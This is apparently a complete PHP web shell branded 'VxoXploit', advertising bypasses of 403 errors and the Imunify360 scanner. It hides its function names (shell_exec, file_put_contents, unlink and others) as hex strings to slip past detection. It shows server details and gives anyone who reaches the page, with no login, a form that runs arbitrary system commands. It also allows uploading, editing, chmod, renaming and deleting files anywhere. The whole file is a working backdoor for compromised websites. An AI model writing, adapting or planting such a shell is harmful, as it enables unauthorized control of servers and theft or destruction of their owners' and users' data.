<?php

          /**
            * Code By : https://github.com/Tituss22
            * Fitur shell:
            - Bypass 403 Forbidden
            - Bypass All Server
            - Bypass Imunify360
            - Bypass Not Acceptable
          **/

$iniarray = 	[
				"7068705F756E616D65",
				"73657373696F6E5F7374617274",
				"6572726F725F7265706F7274696E67",
				"70687076657273696F6E",
				"66696C655F7075745F636F6E74656E7473",
				"66696C655F6765745F636F6E74656E7473",
				"66696C657065726D73",
				"66696C656D74696D65",
				"66696C6574797065",
				"68746D6C7370656369616C6368617273",
				"737072696E7466",
				"737562737472",
				"676574637764",
				"6368646972",
				"7374725F7265706C616365",
				"6578706C6F6465",
				"666C617368",
				"6D6F76655F75706C6F616465645F66696C65",
				"7363616E646972",
				"676574686F737462796E616D65",
				"7368656C6C5F65786563",
				"74727565",
				"6469726E616D65",
				"64617465",
				"6D696D655F636F6E74656E745F74797065",
				"66756E6374696F6E5F657869737473",
				"6673697A65",
				"726D646972",
				"756E6C696E6B",
				"6D6B646972",
				"72656E616D65"
		];

for ($i = 0; $i < count($iniarray); $i++) {
	$func[$i] =	hexa($iniarray[$i]);
}

$func[1]();
$func[2](0);
function fsize($file) {
	$a = ["B", "KB", "MB", "GB", "TB", "PB"];
	$pos = 0;
	$size = filesize($file);
	while ($size >= 1024) {
		$size /= 1024;
		$pos++;
	}
	return round($size, 2)." ".$a[$pos];
}

function hexa($str) {
	$r = "";
	$len = (strlen($str) - 1);
	for ($i = 0; $i < $len; $i += 2) {
		$r .= chr(hexdec($str[$i].$str[$i + 1]));
	}
	return $r;
}

function flash($message, $status, $class, $redirect = false) {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["class"])) {
		unset($_SESSION["class"]);
	}
	if (!empty($_SESSION["status"])) {
		unset($_SESSION["status"]);
	}
	$_SESSION["message"] = $message;
	$_SESSION["class"] = $class;
	$_SESSION["status"] = $status;
	if ($redirect) {
		header('Location: ' . $redirect);
		exit();
	}
	return $func[21];
}

function clear() {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["class"])) {
		unset($_SESSION["class"]);
	}
	if (!empty($_SESSION["status"])) {
		unset($_SESSION["status"]);
	}
	return $func[21];
}

if (isset($_GET['dir'])) {
	$path = $_GET['dir'];
	$func[13]($_GET['dir']);
} else {
	$path = $func[12]();
}

$path = $func[14]('\\', '/', $path);
$exdir = $func[15]('/', $path);


if (isset($_POST['newFolderName'])) {
	if ($func[29]($path . '/' . $_POST['newFolderName'])) {
		$func[16]("Create Folder Successfully!", "Success", "success", "?dir=$path");
	} else {
		$func[16]("Create Folder Failed", "Failed", "error", "?dir=$path");
	}
}
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
	if ($func[4]($_POST['newFileName'], $_POST['newFileContent'])) {
		$func[16]("Create File Successfully!", "Success", "success", "?dir=$path");
	} else {
		$func[16]("Create File Failed", "Failed", "error", "?dir=$path");
	}
}

if (isset($_POST['newName']) && isset($_GET['item'])) {
	if ($_POST['newName'] == '') {
		$func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
	}
	if ($func[30]($path. '/'. $_GET['item'], $_POST['newName'])) {
		$func[16]("Rename Successfully!", "Success", "success", "?dir=$path");
	} else {
		$func[16]("Rename Failed", "Failed", "error", "?dir=$path");
	}
}
if (isset($_POST['newContent']) && isset($_GET['item'])) {
	if ($func[4]($path. '/'. $_GET['item'], $_POST['newContent'])) {
		$func[16]("Edit Successfully!", "Success", "success", "?dir=$path");
	} else {
		$func[16]("Edit Failed", "Failed", "error", "?dir=$path");
	}
}
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
	if ($_POST['newPerm'] == '') {
		$func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
	}
	if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
		$func[16]("Change Permission Successfully!", "Success", "success", "?dir=$path");
	} else {
		$func[16]("Change Permission", "Failed", "error", "?dir=$path");
	}
}
if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
	if (is_dir($_GET['item'])) {
		if ($func[27]($_GET['item'])) {
			$func[16]("Delete Successfully!", "Success", "success", "?dir=$path");
		} else {
			$func[16]("Delete Failed", "Failed", "error", "?dir=$path");
		}
	} else {
		if ($func[28]($_GET['item'])) {
			$func[16]("Delete Successfully!", "Success", "success", "?dir=$path");
		} else {
			$func[16]("Delete Failed", "Failed", "error", "?dir=$path");
		}
	}
}
if (isset($_FILES['uploadfile'])) {
	if ($func[17]( $_FILES['uploadfile']['tmp_name'], $_FILES['uploadfile']['name'])) {
		$func[16]("Upload Successfully!", "Success", "success", "?dir=$path");
	} else {
		$func[16]("Upload Failed", "Failed", "error", "?dir=$path");
	}
}
$dirs = $func[18]($path);

?>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
	<title> VxoXploit </title>
</head>

<body class="bg-dark text-light">
	<div class="container-fluid justify-content-center align-items-center">
		<div class="py-3" id="main">
			<div class="box shadow bg-dark p-4 rounded-3">
				<div class="col-md-12">
					<div class="table-responsive">
						<table class="table table-sm table-dark">
							<tr>
								<td>Uname</td>
								<td>: <?= $func[0]() ?></td>
							</tr>
							<tr>
								<td>Software</td>
								<td>: <?= $_SERVER['SERVER_SOFTWARE'] ?></td>
							</tr>
							<tr>
								<td>PHP</td>
								<td>: <?= $func[3](); ?></td>
							</tr>
							<tr>
								<td>IP Server</td>
								<td>: <?= !@$_SERVER['SERVER_ADDR'] ? $func[19]($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?></td>
							</tr>
							<tr>
								<td>Port</td>
								<td>: <?= $_SERVER['SERVER_NAME'] ?>:<?= $_SERVER['SERVER_PORT'] ?></td>
							</tr>
							<tr>
								<td>Mail</td>
								<td>: <?= ($func[26]('mail')) ? 'ON' : 'OFF' ?></td>
							</tr>
						</table>
					</div>
				</div>
				<div class="breadcrumb">
					<i class="fa fa-home pt-1 me-1"></i> ~ <span class="mx-1"><?php foreach ($exdir as $id => $pat) : 
						if ($pat == '' && $id == 0):
					?>
					<a href="?dir=/" class="text-decoration-none text-light">/</a>
					<?php endif; if ($pat == '') continue; ?>
					<?php if ($id + 1 == count($exdir)) : ?>
					<span class="text-secondary"><?= $pat ?></span>
					<?php else : ?>
					<a href="?dir=
					<?php
					for ($i = 0; $i <= $id; $i++) {
						echo "$exdir[$i]";
						if ($i != $id) echo "/";
					}
					?>
					" class="text-decoration-none text-light"><?= $pat ?></a><span class="text-light"> /</span>
					<?php endif; ?>
					<?php endforeach; ?></span>
					<a href="?" class="text-light text-decoration-none mx-2">[ HOME ]</a>
				</div>
				<div class="d-flex justify-content-between">
					<div class="p-2">
						<form action="" method="post">
							<div class="row">
								<div class="col-md-9 mb-3">
									<input type="text" class="form-control form-control-sm" name="command" placeholder="Command">
								</div>
								<div class="col-md-3">
									<button type="submit" class="btn btn-outline-light btn-sm">Exec</button>
								</div>
							</div>
						</form>
					</div>
					<div class="p-2">
						<form action="" method="post" enctype="multipart/form-data">
							<div class="row">
								<div class="col-md-9 mb-3">
									<input type="file" class="form-control form-control-sm" name="uploadfile" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
								</div>
								<div class="col-md-3">
									<button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
								</div>
							</div>
						</form>
					</div>
				</div>
				<div class="container" id="tools">
					<?php if (isset($_POST['command'])) : ?>
					<div class="row justify-content-center">
						<pre><?= $func[20]($_POST['command']) ?></pre>
					</div>
					<?php endif; ?>
					<?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
					<div class="row justify-content-center">
						<?php if ($action == 'rename' && isset($_GET['item'])) : ?>
						<form action="" method="post">
							<div class="mb-3">
								<label for="name" class="form-label">New Name</label>
								<input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
							</div>
							<button type="submit" class="btn btn-outline-light">Submit</button>
							<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
						</form>
						<?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
						<form action="" method="post">
							<div class="mb-3">
								<label for="name" class="form-label"><?= $_GET['item'] ?></label>
								<textarea name="newContent" rows="10" class="form-control"><?= $func[9]($func[5]($path. '/'. $_GET['item'])) ?></textarea>
							</div>
							<button type="submit" class="btn btn-outline-light">Submit</button>
							<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
						</form>
						<?php elseif ($action == 'view' && isset($_GET['item'])) : ?>
						<div class="mb-3">
							<label for="name" class="form-label">File Name : <?= $_GET['item'] ?></label>
							<textarea name="newContent" rows="10" class="form-control" disabled=""><?= $func[9]($func[5]($path. '/'. $_GET['item'])) ?></textarea>
							<br>
							<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
						</div>
						<?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
						<form action="" method="post">
							<div class="mb-3">
								<label for="name" class="form-label"><?= $_GET['item'] ?></label>
								<input type="text" class="form-control" name="newPerm" value="<?= $func[11]($func[10]('%o', $func[6]($_GET['item'])), -4); ?>">
							</div>
							<button type="submit" class="btn btn-outline-light">Submit</button>
							<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
						</form>
						<?php endif; ?>
					</div>
					<?php endif; ?>
					<div class="row justify-content-center">
						<div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
							<form action="" method="post">
								<div class="mb-3">
									<label for="name" class="form-label">Folder Name</label>
									<input type="text" class="form-control" name="newFolderName" placeholder="folder">
								</div>
								<button type="submit" class="btn btn-outline-light">Submit</button>
							</form>
						</div>
						<div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
							<form action="" method="post">
								<div class="mb-3">
									<label for="name" class="form-label">File Name</label>
									<input type="text" class="form-control" name="newFileName" placeholder="index.php">
								</div>
								<div class="mb-3">
									<label for="name" class="form-label">File Content</label>
									<textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World"></textarea>
								</div>
								<button type="submit" class="btn btn-outline-light">Submit</button>
							</form>
						</div>
						<div class="collapse" id="infoCollapse" data-bs-parent="#tools" style="transition:none;">
							<div class="table-responsive">
								<table class="table table-hover table-dark text-light">
									<tr>
										<td><i class="fa fa-folder-plus"> fa fa-folder-plus</i></td>
										<td>: Add Folder</td>
									</tr>
									<tr>
										<td><i class="fa fa-file-plus"> fa fa-file-plus</i></td>
										<td>: Add File</td>
									</tr>
									<tr>
										<td><i class="fa fa-file-edit"> fa fa-file-edit</i></td>
										<td>: Edit File</td>
									</tr>
									<tr>
										<td><i class="fa fa-edit"> fa fa-edit</i></td>
										<td>: Rename</td>
									</tr>
									<tr>
										<td><i class="fa fa-file-signature"> fa fa-file-signature</i></td>
										<td>: Chmod</td>
									</tr>
									<tr>
										<td><i class="fa fa-trash"> fa fa-trash</i></td>
										<td>: Delete</td>
									</tr>
								</table>
							</div>
						</div>
					</div>
					
				</div>
				<div class="table-responsive">
					<table class="table table-hover table-gray text-light">
						<thead>
							<tr>
								<td style="width:35%">Name</td>
								<td style="width:14%">Type</td>
								<td style="width:14%">Size</td>
								<td style="width:14%">Permission</td>
								<td style="width:14%">Last Modified</td>
								<td style="width:9%">Actions</td>
							</tr>
						</thead>
						<tbody class="text-nowrap">
							<?php
								foreach ($dirs as $dir) :
									if (!is_dir($dir)) continue;
							?>
							<tr>
								<td>
									<?php if ($dir === '..') : ?>
									<a href="?dir=<?= $func[22]($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
									<?php elseif ($dir === '.') :  ?>
									<a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
									<?php else : ?>
									<a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
									<?php endif; ?>
								</td>
								<td class="text-light"><?= $func[8]($dir) ?></td>
								<td class="text-light">-</td>
								<td class="text-light"><?= $func[11]($func[10]('%o', $func[6]($dir)), -4); ?></td>
								<td class="text-light"><?= $func[23]("Y-m-d h:i:s", $func[7]($dir)); ?></td>
								<td>
									<?php if ($dir != '.' && $dir != '..') : ?>
									<div class="btn-group">
										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1">rename<i class="fa fa-edit"></i></a>
										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1">chmod<i class="fa fa-file-signature"></i></a>
										<a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')">hapus<i class="fa fa-trash"></i></a>
									</div>
									<?php elseif ($dir === '.') : ?>
									<div class="btn-group" role="group" aria-label="Basic example">
										<a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1">Buat Folder<i class="fa fa-folder-plus"></i></a>
										<a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1">Buat File<i class="fa fa-file-plus"></i></a>
										<a data-bs-toggle="collapse" href="#infoCollapse" role="button" aria-expanded="false" aria-controls="infoCollapse" class="btn btn-outline-light btn-sm mr-1">Info<i class="fa fa-info"></i></a>
									</div>
									<?php endif; ?>
								</td>
							</tr>
							<?php endforeach; ?>
							<?php
								foreach ($dirs as $dir) :
									if (!is_file($dir)) continue;
							?>
							<tr>
								<td>
									<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=view" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
								</td>
								<td class="text-light"><?= ($func[25]('mime_content_type') ? $func[24]($dir) : $func[8]($dir)) ?></td>
								<td class="text-light"><?= $func[26]($dir) ?></td>
								<td class="text-light"><?= $func[11]($func[10]('%o', $func[6]($dir)), -4); ?></td>
								<td class="text-light"><?= $func[23]("Y-m-d h:i:s", $func[7]($dir)); ?></td>
								<td>
									<?php if ($dir != '.' && $dir != '..') : ?>
									<div class="btn-group" role="group" aria-label="Basic example">
										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1">edit<i class="fa fa-file-edit"></i></a>
										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1">rename<i class="fa fa-edit"></i></a>
										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1">chmod<i class="fa fa-file-signature"></i></a>
										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=delete" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')">hapus<i class="fa fa-trash"></i></a>
									</div>
									<?php endif; ?>
								</td>
							</tr>
							<?php endforeach; ?>
						</tbody>
					</table>
				</div>
			</div>
		</div>
	</div>
	<div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2022 - Code By VxoXploit</small></div>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
	<script>
	<?php if (isset($_SESSION['message'])) : ?>
				Swal.fire(
					'<?= $_SESSION['status'] ?>',
					'<?= $_SESSION['message'] ?>',
					'<?= $_SESSION['class'] ?>'
				)
	<?php endif; clear(); ?>
		function deleteConfirm(url) {
			event.preventDefault()
			Swal.fire({
			  	title: 'Are you sure?',
			  	icon: 'warning',
			  	showCancelButton: true,
			  	confirmButtonColor: '#3085d6',
			  	cancelButtonColor: '#d33',
			  	confirmButtonText: 'Yes, delete it!'
			}).then((result) => {
			  	if (result.isConfirmed) {
			  		window.location.href = url
			  }
			})
		}
	</script>
</body>
</html>